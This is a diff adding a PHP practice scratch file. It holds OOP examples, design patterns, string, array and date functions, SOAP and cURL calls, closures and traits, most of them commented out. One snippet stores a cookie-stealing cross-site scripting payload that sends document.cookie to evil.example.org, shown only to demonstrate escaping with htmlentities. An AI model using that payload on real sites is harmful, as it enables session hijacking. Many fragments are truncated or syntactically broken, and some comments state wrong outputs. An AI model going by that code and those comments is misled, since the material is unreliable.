@@ -1,0 +1,925 @@
+<?php 
+/**
+class test{
+  public $name;
+  public $sex;
+  public static  $age=10;
+  const T=123;
+  public function __construct($name,$sex){
+      $this->name=$name;
+	  $this->sex=$sex;
+  }
+  public function __get($pro){
+     $method="get{$pro}";
+	 if(method_exists($this,$method))
+	 return $this->$method();
+  }
+  public function getok(){
+    echo 'ok';
+  }
+  public function act(){
+   echo  "性别是：".$this->sex."年龄是：".self::$age."常量是".test::T;
+  }
+}
+class test2 extends test{
+   public $hobby;
+   public function __construct($name,$sex,$hobby){
+      parent::__construct($name,$sex);
+	  $this->hobby=$hobby;
+  }
+  
+   public function act(){
+       parent::act();
+      echo  $this->hobby;
+  }
+}
+abstract class test3{
+  abstract public function tt(); 
+}
+class test4 extends test3{
+   public function tt(){
+     echo 'xx';
+  }
+}
+interface test5{
+   public function xx();
+} 
+class test6 implements test5{
+
+   public function xx(){     
+	  echo 'haha';
+   }
+}
+$t6=new test6();
+$t6->xx();
+$t2=new test2('aa','male','play');
+$t2->act();
+$t1=new test('pk','male'); 
+
+$t1->ok;
+var_dump($a);
+echo  '<hr>';
+$test=new ReflectionClass('test');
+Reflection::export($test);
+ abstract class Employee{
+    protected $name;
+	function __construct($name){
+           $this->name=$name;
+	}
+	abstract function fire();
+ }
+class Minion extends Employee{
+   function fire(){
+     echo "{$this->name}:"."i'll clear the table<br/>";
+   }
+}
+class NastyBoss{
+   private $employees=array();
+   function addEmployee(Employee $employeeName){
+       $this->employees[]=$employeeName;         //  new Minion($employeeName);
+   }
+   function projectFails(){
+       if(count($this->employees)>0){
+	    $emp=array_pop($this->employees);
+		$emp->fire();
+	   }	   
+   }
+}
+class CluedUp extends Employee{
+     function fire(){
+     echo "{$this->name}:"."i'll call the lawyer<br/>";
+   }
+}
+$boss=new NastyBoss();
+$boss->addEmployee(new Minion('pk1'));
+$boss->addEmployee(new Minion('pk2'));
+$boss->addEmployee(new CluedUp('pk3'));
+$boss->projectFails();
+$boss->projectFails();
+$boss->projectFails();
+
+//单例模式(singleton)
+class Prefences{
+  private $props=array();
+  private  static $instance;
+  public function __construct(){}
+  public static function getinstance(){
+     if(empty(self::$instance))
+       self::$instance=new Prefences();
+	 return 	self::$instance;
+  }
+  public function setProperty($key,$val){
+    $this->props[$key]=$val;
+  }
+  public function getProperty($key){
+    return $this->props[$key];
+  }
+}
+$pref=Prefences::getinstance();
+$pref->setProperty('name','mat');
+unset($pref);//移除引用
+$pref2=Prefences::getinstance();
+echo $pref2->getProperty('name');
+//工厂模式(factory method)
+class CommsManager{
+  const BLOGGS=1;
+  const MEGA=2;
+  private $mode;
+  function __construct($mode){
+     $this->mode=$mode;
+  }
+  function getHeaderText(){
+    switch($this->mode){
+	   case self::BLOGGS :
+	     return "BLOGGS";
+	   default:
+         return "MEGA"; 	   
+	}
+  }
+  function getAPPTEncoder(){
+    switch($this->mode){
+	   case self::BLOGGS :
+	     return new BLOGGSEncoder();
+	   default:
+         return new MEGAEncoder();	   
+	}
+  }
+}
+//抽象工厂(abstract factory) 
+abstract class CommManager{
+   const APPT =1;
+   const TTD =2;
+   const CONTACT=3;
+   abstract function getHeaderText();
+   abstract function make($flag_int);
+   abstract function getFooterText();
+}    
+class BloggsCommsManager extends CommsManager{
+     function getHeaderText(){
+	   return "BloggsCal header\n";
+	 }
+	 function make($flag_int){
+	   switch($flag_int){
+	    case self::APPT:
+		   return new BloggsApptEncoder();
+		case self::CONTACT:
+            return new BloggsContactEncoder();
+		case self::TTD:
+            return new BloggsTtdEncoder();		
+	   }
+	 }
+	 function getFooterText(){
+	    return "BloggsCal footer\n";
+	 }	 
+}
+//prototype(原型模式)
+class Sea{}
+class EarthSea extends Sea{}
+class MarsSea extends Sea{}
+
+class Plain{}
+class EarthPlains extends Plain{}
+class MarsPlains extends Plain{}
+class Forest{}
+class EarthForest extends Forest{}
+class MarsForest  extends Forest{}
+
+class TerrainFactory{
+  private $sea;
+  private $forest;
+  private $plains;
+  function __construct(Sea $sea,Plain $plains,Forest $forest){
+     $this->sea=$sea;
+	 $this->plains=$plains;
+	 $this->forest=$forest;
+  }
+  function getSea(){
+     return clone $this->sea;	 
+  }
+  function getPlains(){
+     return clone $this->plains;	 
+  }  
+  function getForest(){
+      return  clone $this->forest;
+  }
+}
+$factory=new TerrainFactory( new EarthSea(),new EarthPlains(),new EarthForest() );
+print_r($factory->getSea());
+print_r($factory->getPlains());
+print_r($factory->getForest());
+
+$a=0;$b = 5;
+if($a && $b++)
+echo $a.'aaa'.$b;
+echo $b;
+
+ function &test() 
+{ 
+static $b=0;//申明一个静态变量 
+$b=$b+1; 
+echo $b; 
+return $b; 
+} 
+
+$a=test();//这条语句会输出　$b的值　为１ 
+$a=5; 
+$a=test();//这条语句会输出　$b的值　为2 
+
+$a=&test();//这条语句会输出　$b的值　为3 
+$a=0; 
+$a=test();//这条语句会输出　$b的值　为6 
+echo date('d',time());
+
+$arr=array('a'=>123,'b'=>456);
+echo http_build_query($arr);
+//header("Content-Type:text/html;charset=utf-8");
+//class SoapUserInfo {
+/**
+* @var char $name
+*/
+ //public $Username;
+/**
+* @var char $password
+
+$c = new SoapClient( 'http://www.webxml.com.cn/WebServices/WeatherWS.asmx?wsdl',
+			     array( 'trace' => true, 'exceptions' => true ) );
+ 
+var_dump( $c->__getFunctions() );
+var_dump( $c->__getTypes() );
+//不需要参数的情况
+$pr =$c->getRegionProvince();
+var_dump( $pr->getRegionProvinceResult->string );
+ 
+//带有参数的情况
+$_GET['theRegionCode'];
+$scs = $c->getSupportCityString( array( 'theRegionCode' => $_GET['theRegionCode'] ) );
+var_dump( $scs->getSupportCityStringResult->string );
+ 
+也可以这样做
+$we = $c->__call('getWeather', array( array( 'theCityCode' => 2210 ) ) );
+var_dump( $we );
+$test='sdf42d';
+if(ctype_alpha($test))
+echo 'ok';
+echo md5(uniqid(mt_rand(),true));
+echo "aaaa\0dfdsf";
+echo date('w');
+    $str = "狗";
+	 $str[0] = '1';
+   $str[1] = '2';
+    $str[2] = '3';
+    echo $str;
+   var_dump($str);//print_r($str[1]);exit;
+    echo addslashes($str);
+   $test=null;
+   if(isset($test))
+     echo 'ok';
+	 else
+	 echo 'bad';
+	 $vAbR = 1;
+	 ${'thahat'} = 1;
+	 &$vAbR = 1;
+	$array = array ('3'=> 'a', '1b'=>'b','c','d');
+   print_r($array);
+ $a=$b=0;
+  echo (0 || $b);
+if($a=0 || ($b =2))
+{
+  var_dump($a,$b);
+}
+
+$a=0;
+$a=$b=0;
+var_dump($a,$b);
+$str = 'abc_Befg_Tle';
+echo strtolower(implode(explode('_',$str)));
+$time = '2011-02-02 20:30:00';
+$t = strtotime($time);
+echo $t;*/
+/**function c1($str) {
+    $str = strrev($str);
+    $arr = str_split($str,3); //把字符串按3个字符的长度拆成数组.
+    $str = strrev(implode($arr,','));
+        $str = substr($str,0,-2);
+    return $str;
+        }
+        echo c1('1234567890')."<br/>";
+		echo chunk_split('1234567890',3,',');
+		print_r(str_split('1234567890',3));*/
+/**		 $a=0;
+$b=0;
+if($a=3 ||$b=2){
+    $a;
+  $b++;
+}
+//echo $a.",".$b;*/
+/**arr=array(2,3,4,5,6);
+print_r(array_values($arr));
+$text = '<p>Test paragraph.</p><!-- Comment --> <a href="#fragment">Other text</a>';
+echo $text."<br/>";echo strip_tags($text);
+echo "\n";
+$a6 = 'null';
+var_dump(empty($a6));
+  $arr = array (1,5,13,11,44,22,4,88,13,1);
+    function aa($arr){
+    $tempArr=array();
+    foreach($arr as $k=>$v){
+    array_key_exists($v,$tempArr)? $tempArr[$v]=$tempArr[$v]+1:$tempArr[$v]=1;
+
+    }
+
+    return $tempArr;
+    }
+    print_r(aa($arr));
+
+$txt = <<<STRING
+commencement season is once again upon us and with that comes a
+flurry of leaders traversing the country to don the ceremonial
+cap and gown, all with the mission of imparting words of wisdom
+and lessons learned upon 2013’s newly-minted grads. Universities
+may vie to land bold-faced names for their esteemed commencement
+speaker slots, yet even the most prestigious leaders have fallen
+short when it comes to inspiring a future generation of leaders
+thanks to addresses peppered more with formulaic life lessons
+than authentic personal reflections
+STRING;
+/**
+echo ord($txt[0]);
+if (ord($txt[0])>96 && ord($txt[0])<123) {
+    $txt[0] = chr(ord($txt[0])-32);
+}echo chr(ord($txt[0]));
+for ($i=0, $strlen=strlen($txt); $i<$strlen-1; $i++) {
+    $ordCur = ord($txt[$i]);
+    $ordNext = ord($txt[$i+1]);
+    if ($ordCur==32 && (($ordNext>96) && ($ordNext<123))) {
+        $txt[$i+1] = chr($ordNext-32);
+    }
+}*/
+// echo 8%(-2);
+/*$a=array("a","b","c","d","e","b","c","d","e","f");
+$c=implode('',$a);
+echo '<hr/>';
+$b="";
+$d=array_unique($a);
+$f=array();
+foreach($d as $k=>$v){
+   $f[]=$v;
+}
+for($i=0;$i<count($f);$i++){
+        $b=$f[$i];		
+     echo $b.'出现了'.substr_count($c,$b).'次<br>';
+}
+$str='aaaaaaabbbbbcccccccddddddd';
+echo substr_count($str,'e');
+$a=array(4,3,5,2,7,3,'3'=>2,8,1,9);
+print_r($a);
+krsort($a);
+print_r($a);
+define('TEST','aha');
+echo constant('TEST');
+echo count('123
+echo substr_replace('hello world','pk',6
+echo -8%(-3);
+echo max(3,5,2,23,1,22);
+$a='0';
+(empty($a
+define('PI',3.14);
+var_dump(PI);
+$a=12;
+print $a+3+1;
+ a{
+}
+$a=new a();
+echo (int)($a);
+$arr=array('a','b','c','d');
+print_r(array_flip($arr));
+print_r(array_map('ucfirst',$arr));*/
+/**function timesTwo($int){
+  $int=$int*2;
+}$int=2;
+$r=timesTwo($int);
+var_dump($r);
+$a=in_array('01',array('1'));
+var_dump($a);
+var_dump('01'==1);
+printf('%1.2f',42);
+$a=<<<END
+jajaja afrrtgre
+END;
+echo $a;
+$path = "/testweb/home.php";
+print_r(basename($path));
+echo str_replace('\\','/',__FILE__);
+echo base64_encode(__FILE__);
+echo substr_replace('hello world','pk',6);
+var_dump(is_null($sdsf));
+$a=$b=$c=0;
+var_dump($c);
+var_dump($b);
+var_dump($a);
+echo $b&$c;
+$arr=array('a','b','c');
+print_r(array_fill(0,2,$arr));
+$d=date('j','1373249640');
+echo date('y-M-jS-n');
+echo date('Y-m-d',strtotime("-{$d} days",'1373249640'));
+print_r(debug_print_backtrace());
+function f1($x,$y){$x+=$y;}
+$z=f1(2,3);var_dump($z);
+$arr=getdate();
+print_r($arr);
+var_dump(json_decode(json_encode(array('2'=>2,'3'=>3))));
+/**$xml_data = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+	<TaskDataTransfer4EReq xmlns="http://www.aspirehld.com/iecp/TaskDataTransfer4EReq">
+	<eid> </eid>
+	<username> </username>
+	<password> </password>
+	<src> </src>
+	<destmsisdn>'.$pns.'</destmsisdn>
+	<content type="sms">
+	    <title>'.$content.'</title>
+	</content>
+	</TaskDataTransfer4EReq>';
+	 
+	$url = 'http://www.nowamagic.net/service/taskSubmit';//接收XML地址	 
+	$header = "Content-type: text/xml";//定义content-type为xml
+	$ch = curl_init(); //初始化curl
+	curl_setopt($ch, CURLOPT_URL, $url);//设置链接
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);//设置是否返回信息
+	curl_setopt($ch, CURLOPT_HTTPHEADER, $header);//设置HTTP头
+	curl_setopt($ch, CURLOPT_POST, 1);//设置为POST方式
+	curl_setopt($ch, CURLOPT_POSTFIELDS, $xml_data);//POST数据
+	$response = curl_exec($ch);//接收返回信息
+	if(curl_errno($ch)){//出错则显示错误信息
+	    print curl_error($ch);
+	}
+	curl_close($ch); //关闭curl链接
+	echo $response;//显示返回信息*/
+   // 1. 初始化
+  // phpinfo();exit;
+/**$ch = curl_init();
+// 2. 设置选项，包括URL
+curl_setopt($ch, CURLOPT_URL, "http://www.baidu.com");
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+// 3. 执行并获取HTML文档内容
+$output = curl_exec($ch);
+// 4. 释放curl句柄
+curl_close($ch);
+$output = curl_exec($ch);
+if ($output === FALSE) {
+    echo "cURL Error: " . curl_error($ch);
+}echo $output;*/
+//echo bcmul(8.20,100);
+//print_r(gd_info());
+/**$im=imagecreatetruecolor(300,200);
+$gray=imagecolorallocate($im,100,100,100);
+imagefill($im,0,0,$gray);
+imagepng($im,'./1.png');
+imagedestroy($im);*/
+/**$im=imagecreatefrompng('./1.png');
+$blue=imagecolorallocate($im,0,0,255);
+imageline($im,0,0,100,100,$blue);
+header('content-type:image/png');
+imagepng($im);*/
+//echo __FILE__.__LINE__.__DIR__;
+//echo $_SERVER['DOCUMENT_ROOT'];
+/**$fh=fopen('./test.txt','a');
+$notice=rand(1,10000)."\r\n";
+fwrite($fh,$notice);
+fclose($fh);*/
+//echo dirname(__FILE__);
+/**function t($a,$b){
+ echo $a,$b;
+}
+call_user_func('t','1','2');
+call_user_func_array('t',array('1','2'));*/
+//import_request_variable("p"， "post_");
+/**	if(isset($_REQUEST['btn_submit'])){
+	echo "正常取得的表单POST变量值：".$_REQUEST['Username']."<br />";
+	import_request_variables("pg", "import_");
+	//显示导入的变量名称
+	echo "使用import_request_variables函数导入的变量值：".$import_Username;
+	}
+	?>
+	<form id="test_form" name="test_form" method="POST" action="">
+	请输入您的名字：
+	<label>
+	<input type="text" name="Username" id="Username" />
+	</label>
+	<label>
+	<input type="submit" name="btn_submit" id="btn_submit" value="提交" />
+	</label>
+	<br />
+	</form> */
+/**$arr=array('a','b','c');
+shuffle($arr);
+//print_r($arr);
+$randomized_keys = array_rand($arr, 1); 
+print_r($randomized_keys);	*/
+/**session_start();
+session_id('hello,world');
+echo session_id();
+$str = "NowaMagic";
+session_name($str);echo session_name();
+echo  session_id();
+$str='<p>haah</p>';
+$str = '<a href="http://www.nowamagic.net">nowamagic';
+echo $str;
+echo htmlspecialchars($str);
+$arr = array ( 1 , 2 , array ( "apple" , "banana" , "orange" )); 
+$arr2=var_export ( $arr,true);  
+print_r($arr2
+ echo getenv('REMOTE_ADDR');
+ ob_start();
+ echo 'aaaaaa';
+ ob_clean();
+ ob_end_flush();*/
+//echo md5(uniqid(rand(),true)) ;
+/**$clean['name']="<script>
+	  document.location =
+	    'http://evil.example.org/steal.php?cookies='"+
+"document.cookie</script>";	
+ echo htmlentities($clean['name'], ENT_QUOTES, 'UTF-8');
+ ini_set('error_reporting', E_ALL | E_STRICT
+ if(ctype_alnum($i))echo 'ok';
+$a=123;
+if(is_int($a))echo 'ok';
+$a=1;$b=2;$c=3;
+$d=$a,$b;
+echo $d;
+*/
+/**$a=0;
+if(is_int((int)$a))echo 'ok';
+if($b=$a)echo 23;echo 45;
+else {
+  echo 67;
+}
+$test=function($a){ echo $a;};
+$test('haha');
+$l='a';
+if($l=='a'){
+  goto a;
+}else{
+  goto b;
+}
+a:goto b;
+b:echo 'bbbbbbbbbbbb';
+$dt=new DateTime('2013-9-15 16:42:33',new DateTimeZone(ini_get('date.timezone')));
+echo $dt->format('Y-m-d h:i:s');
+$pwd='123456';
+echo md5($pwd).'<br/>';
+echo sha1($pwd);
+function t(&$a){
+  $a=123;
+}
+$a=12;
+t($a);
+echo '<br/>'.$a; 
+$a[211]=123;
+echo count($a);
+echo date('Y-m-d H:i:s',strtotime('-1 year',mktime(13,43,43)));
+  class linkList{
+	   private $header,$size;
+	   private $name,$id,$next;
+	   public function getSize(){
+	      $i=0;
+		  $node=$this->header;
+		  while($node->next!=null){
+		    $i++;
+			$node=$node->next;
+		  }
+		  return $i;
+	   }
+	    public function setHeader($value){
+          $this->header=$value;
+       }
+        public function getHeader(){
+	        return $this->header;
+	    }
+	   public function __construct($name,$id){
+	      if(empty($head)){ //如果头为空则链表为空
+		    $head->name=$name;
+			$head->id=$id;
+			$head->next=null;
+		  }
+	   }
+   }
+   $test=new linkList('aaaa',1);
+   var_dump($test);
+ class Node{
+    private $data;
+	private $next;
+	public function __construct($data,$next){
+	   $this->setData($data);
+	   $this->setNext($next);
+	}
+	public function getData(){
+	 return $this->data;
+	}
+	public function setDate($date){
+	   $this->data=$data;
+	}
+	public function getNext(){
+	  return   $this->next;
+	}
+	public function setNext($next){
+	   $this->next=$next;
+	}
+ } 
+ $uid=array();
+$a='';
+$a.='123';
+$a.='123';
+echo $a;
+$a='aaaa';
+$b='gggg';
+$a=$a^$b;
+$b=$b^$a;
+$a=$a^$b;
+echo $a.'@@'.$b;
+error_reporting(E_ALL);
+$a = 'I am test.';
+$b = & $a;
+$b = null;
+echo '$a = '. $a ."n";
+echo '$b = '. $b ."n"; 
+class A{
+    protected     $var1;                                //public  protected和private  结果不一样
+    public function __construct(){
+        $this->var1 = 'A';
+    }
+    public function display(){
+        var_dump($this->var1);
+    }
+}
+
+class B extends A{
+    //public $var1;
+    public function __construct(){
+        parent::__construct();
+        //$this->var1 = 'B';
+    }
+    public function display2(){
+        parent::display();
+        var_dump($this->var1);
+    }
+}
+
+$b = new B();
+$b->display2();
+$func = create_function('', 'echo "Function created dynamic";');
+echo $func; // lambda_1	  
+$func();    // Function created dynamic
+$my_func = chr(0)."lambda_1";
+$my_func(); // Hello
+function getCounter() {
+	    $i = 0;
+	    return function() use(&$i) { // 这里如果使用引用传入变量: use(&$i)
+	        echo ++$i;
+	    };
+	}	  
+$counter = getCounter();
+$counter(); // 1
+echo "<br/>";
+$counter(); // 1
+$func = create_function('', 'echo "Function created dynamic";');
+echo $func; // lambda_1
+$func();    // Function created dynamic
+$my_func = 'lambda_1';
+//$my_func(); // 不存在这个函数
+//lambda_1(); // 不存在这个函数
+class Callme {
+public function __invoke($phone_num) {
+	        echo "Hello: $num";
+	    }
+}
+$call = new Callme();
+$call(13810688888); // "Hello: 13810688888
+
+$func = function() {
+  echo "Hello, anonymous function";
+}
+echo gettype($func);    // object
+echo get_class($func);  // Closure
+
+function getCounter() {
+	    $i = 0;
+	    return function() use($i) { // 这里如果使用引用传入变量: use(&$i)
+	        echo ++$i;
+    };
+}
+$counter = getCounter();
+$counter(); // 1
+$counter(); // 1
+highlight_string ( '<?php phpinfo(); 
+register Globals  magic_quotes_gpc()
+echo  $_SERVER [ 'HTTP_USER_AGENT' ] .  "\n\n" ;
+$browser  =  get_browser ( null ,  true );
+print_r ( $browser );
+print_r ( get_defined_constants ( true ));
+echo connection_aborted(); 
+echo         php_strip_whitespace ( __FILE__ );
+var_dump ( time_sleep_until ( time ()+1 ));
+class  foo  {
+    public  $value  =  42 ;
+
+    public function  getValue () {
+        return  $this -> value ;
+    }
+}
+$obj  = new  foo ;
+$myValue  =  $obj -> getValue ();  // $myValue is a reference to $obj->value, which is 42.
+$obj -> value  =  2 ;
+echo  $myValue ;     
+function  inverse ( $x ) {
+    if (! $x ) {
+        throw new  Exception ( 'Division by zero.' );
+    }
+    else return  1 / $x ;
+}
+
+try {
+    echo  inverse ( 5 ) .  "\n" ;
+    echo  inverse ( 0 ) .  "\n" ;
+} catch ( Exception $e ) {
+    echo  'Caught exception: ' ,   $e -> getMessage (),  "\n" ;
+}
+
+Continue execution
+echo  'Hello World' ;
+function  foo ()
+{
+  function  bar ()
+  {
+    echo  "I don't exist until foo() is called.\n" ;
+  }
+}
+*/
+/* 现在还不能调用bar()函数，因为它还不存在 */
+/**
+foo ();
+print_r(get_loaded_extensions() );
+ echo  preg_replace_callback ( '~-([a-z])~' , function ( $match ) {
+    return  strtoupper ( $match [ 1 ]);
+},  'hello-world' ); 
+class  Cart
+{
+    const  PRICE_BUTTER   =  1.00 ;
+    const  PRICE_MILK     =  3.00 ;
+    const  PRICE_EGGS     =  6.95 ;
+
+    protected    $products  = array();
+    
+    public function  add ( $product ,  $quantity )
+    {
+         $this -> products [ $product ] =  $quantity ;
+    }
+    
+    public function  getQuantity ( $product )
+    {
+        return isset( $this -> products [ $product ]) ?  $this -> products [ $product ] :
+                FALSE ;
+    }
+    
+    public function  getTotal ( $tax )
+    {
+         $total  =  0.00 ;
+        
+         $callback  =
+            function ( $quantity ,  $product ) use ( $tax , & $total )
+            {
+                 $pricePerItem  =  constant ( __CLASS__  .  "::PRICE_"  .
+                     strtoupper ( $product ));
+                 $total  += ( $pricePerItem  *  $quantity ) * ( $tax  +  1.0 );
+            };
+        
+         array_walk ( $this -> products ,  $callback );
+        return  round ( $total ,  2 );;
+    }
+}
+
+$my_cart  = new  Cart ;
+
+// 往购物车里添加条目
+$my_cart -> add ( 'butter' ,  1 );
+$my_cart -> add ( 'milk' ,  3 );
+$my_cart -> add ( 'eggs' ,  6 );
+
+// 打出出总价格，其中有 5% 的销售税.
+print  $my_cart -> getTotal ( 0.05 ) .  "\n" ;
+const  CONSTANT  =  'Hello World' ;
+echo  CONSTANT ;
+$a_bool  =  TRUE ;    // a boolean
+$a_str   =  "foo" ;   // a string
+$a_str2  =  'foo' ;   // a string
+$an_int  =  12 ;      // an integer
+
+echo  gettype ( $a_bool ); 
+echo  gettype ( $a_str );   
+echo floor((0.1+0.7)*10) ;
+$str='<p><img border="0" src="upfiles/2009/07/1246430143_1.jpg" alt=""/></p>';
+$pattern="/<([img|IMG].*?)src=[\'|\"].*?(?:[\.gif|\.jpg])[\'|\"].*?[\/]/";
+preg_match_all($pattern,$str,$match);
+print_r($match); 
+var_dump ( $unset_var );
+$unset_str  .=  'abc' ;
+var_dump ( $unset_str );
+
+declare( ticks = 1 );
+
+ A function called on each tick event
+function  tick_handler ()
+{
+    echo  "tick_handler() called\n" ;
+}
+register_tick_function ( 'tick_handler' );
+$a  =  1 ;  
+var_dump ( $argc );
+
+function  bool2str ( $bool )
+{
+    if ( $bool  ===  false ) {
+        return  'FALSE' ;
+    } else {
+        return  'TRUE' ;
+    }
+}
+
+function  compareObjects (& $o1 , & $o2 )
+{
+    echo  'o1 == o2 : '  .  bool2str ( $o1  ==  $o2 ) .  "\n" ;
+    echo  'o1 != o2 : '  .  bool2str ( $o1  !=  $o2 ) .  "\n" ;
+    echo  'o1 === o2 : '  .  bool2str ( $o1  ===  $o2 ) .  "\n" ;
+    echo  'o1 !== o2 : '  .  bool2str ( $o1  !==  $o2 ) .  "\n" ;
+}
+
+class  Flag
+{
+    public  $flag ;
+
+    function  Flag ( $flag  =  true ) {
+         $this -> flag  =  $flag ;
+    }
+}
+
+class  OtherFlag
+{
+    public  $flag ;
+
+    function  OtherFlag ( $flag  =  true ) {
+         $this -> flag  =  $flag ;
+    }
+}
+
+$o  = new  Flag ();
+$p  = new  Flag ();
+$q  =  $o ;
+$r  = new  OtherFlag ();
+
+echo  "Two instances of the same class\n<br/>" ;
+compareObjects ( $o ,  $p );
+
+echo  "\nTwo references to the same instance\n<br/>" ;
+compareObjects ( $o ,  $q );
+
+echo  "\nInstances of two different classes\<br/>n" ;
+compareObjects ( $o ,  $r );
+class  Base  {
+    public function  sayHello () {
+        echo  'Hello ' ;
+    }
+}
+
+trait SayWorld{
+    public function  sayHello () {
+         parent :: sayHello ();
+        echo  'World!' ;
+    }
+}
+
+class  MyHelloWorld  extends  Base  {
+    use  SayWorld ;
+}
+
+$o  = new  MyHelloWorld ();
+$o -> sayHello ();
+trait HelloWorld  {
+    public function  sayHello () {
+        echo  'Hello World!' ;
+    }
+}
+
+class  TheWorldIsNotEnough  {
+    use  HelloWorld ;
+    public function  sayHello () {
+        echo  'Hello Universe!' ;
+    }
+}
+
+$o  = new  TheWorldIsNotEnough ();
+$o -> sayHello ();*/
+
+
+
+
